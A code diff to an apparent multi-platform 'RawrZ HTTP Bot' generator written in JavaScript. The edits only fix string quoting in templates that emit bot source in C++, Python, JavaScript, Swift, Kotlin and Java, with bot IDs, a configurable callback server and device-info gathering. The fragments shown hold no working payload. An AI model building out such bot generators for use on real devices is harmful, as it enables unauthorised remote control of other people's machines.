@@ -102,19 +102,19 @@ class HTTPBotGenerator {
     generateCPPHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateCPPFeatures(features);
         
-        return "// RawrZ HTTP Bot - C++ Implementation
+        return `// RawrZ HTTP Bot - C++ Implementation
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
-#include <iostream>`
-#include <windows.h>`
-#include <wininet.h>`
-#include <string>`
-#include <vector>`
-#include <thread>`
-#include <chrono>`
-#include <fstream>`
-#include <sstream>`
+#include <iostream>
+#include <windows.h>
+#include <wininet.h>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <fstream>
+#include <sstream>
 
 #pragma comment(lib, "wininet.lib")
 
@@ -188,7 +188,7 @@ public:
         char buffer[4096];
         DWORD bytesRead;
         
-        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead >` 0) {
+        while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
             response.append(buffer, bytesRead);
         }
         
@@ -205,7 +205,7 @@ int main() {
     RawrZHTTPBot bot;
     bot.run();
     return 0;
-}";
+}`;
     }
 
     generateCPPFeatures(features) {
@@ -294,8 +294,8 @@ int main() {
         // HTTP communication operations
     }
     
-    `;
-        }
+`;
+    }
         
         return { init, execute, methods };
     }
@@ -303,7 +303,7 @@ int main() {
     generatePythonHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generatePythonFeatures(features);
         
-        return "#!/usr/bin/env python3
+        return `#!/usr/bin/env python3
 # RawrZ HTTP Bot - Python Implementation
 # Generated: ${timestamp}
 # Bot ID: ${botId}
@@ -381,7 +381,7 @@ class RawrZHTTPBot:
 
 if __name__ == "__main__":
     bot = RawrZHTTPBot()
-    bot.run()";
+    bot.run()`;
     }
 
     generatePythonFeatures(features) {
@@ -473,7 +473,7 @@ if __name__ == "__main__":
     generateJavaScriptHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateJavaScriptFeatures(features);
         
-        return "// RawrZ HTTP Bot - JavaScript Implementation
+        return `// RawrZ HTTP Bot - JavaScript Implementation
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -485,7 +485,7 @@ class RawrZHTTPBot {
     constructor() {
         this.serverUrl = "${config.server || 'http://localhost:8080'}";
         this.botId = "${botId}";
-        this.botName = `${config.name || 'HTTPBot'}`;
+        this.botName = "${config.name || 'HTTPBot'}";
         this.isRunning = false;
     }
     
@@ -674,7 +674,7 @@ bot.run().catch(console.error);`;
     }
 
     generateDefaultHTTPBot(config, features, timestamp, botId) {
-        return "// RawrZ HTTP Bot - Default Implementation
+        return `// RawrZ HTTP Bot - Default Implementation
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -683,13 +683,14 @@ bot.run().catch(console.error);`;
 
 console.log("RawrZ HTTP Bot ${botId} - Default Implementation");
 console.log("Server: ${config.server || 'http://localhost:8080'}");
-console.log(`Features: ${features.join(', ')}`);";
+console.log("Features: ${features.join(', ')}");
+`;
     }
 
     generateSwiftHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateSwiftFeatures(features);
         
-        return "// RawrZ HTTP Bot - Swift Implementation (iOS)
+        return `// RawrZ HTTP Bot - Swift Implementation (iOS)
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -791,7 +792,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
         bot?.run()
         return true
     }
-}";
+}`;
     }
 
     generateSwiftFeatures(features) {
@@ -889,7 +890,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
     generateKotlinHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateKotlinFeatures(features);
         
-        return "// RawrZ HTTP Bot - Kotlin Implementation (Android)
+        return `// RawrZ HTTP Bot - Kotlin Implementation (Android)
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
@@ -988,7 +989,7 @@ class RawrZHTTPBot : Service() {
     " + featureCode.methods + "
     
     override fun onBind(intent: Intent?): IBinder? = null
-}";
+}`;
     }
 
     generateKotlinFeatures(features) {
@@ -1050,17 +1051,17 @@ class RawrZHTTPBot : Service() {
         if (features.includes('mobileDeviceInfo')) {
             init += '        gatherDeviceInfo();\n';
             execute += '                updateDeviceInfo();\n';
-            methods += "    private fun gatherDeviceInfo() {
+            methods += `    private fun gatherDeviceInfo() {
         println("Device: \${android.os.Build.MODEL}")
         println("Android: \${android.os.Build.VERSION.RELEASE}")
-        println(`SDK: \${android.os.Build.VERSION.SDK_INT}`)
+        println("SDK: \${android.os.Build.VERSION.SDK_INT}")
     }
     
     private fun updateDeviceInfo() {
         // Device information updates
     }
     
-    ";
+    `;
         }
         
         if (features.includes('httpComm')) {
@@ -1083,7 +1084,7 @@ class RawrZHTTPBot : Service() {
     generateJavaHTTPBot(config, features, timestamp, botId) {
         const featureCode = this.generateJavaFeatures(features);
         
-        return "// RawrZ HTTP Bot - Java Implementation (Cross-platform)
+        return `// RawrZ HTTP Bot - Java Implementation (Cross-platform)
 // Generated: ${timestamp}
 // Bot ID: ${botId}
 
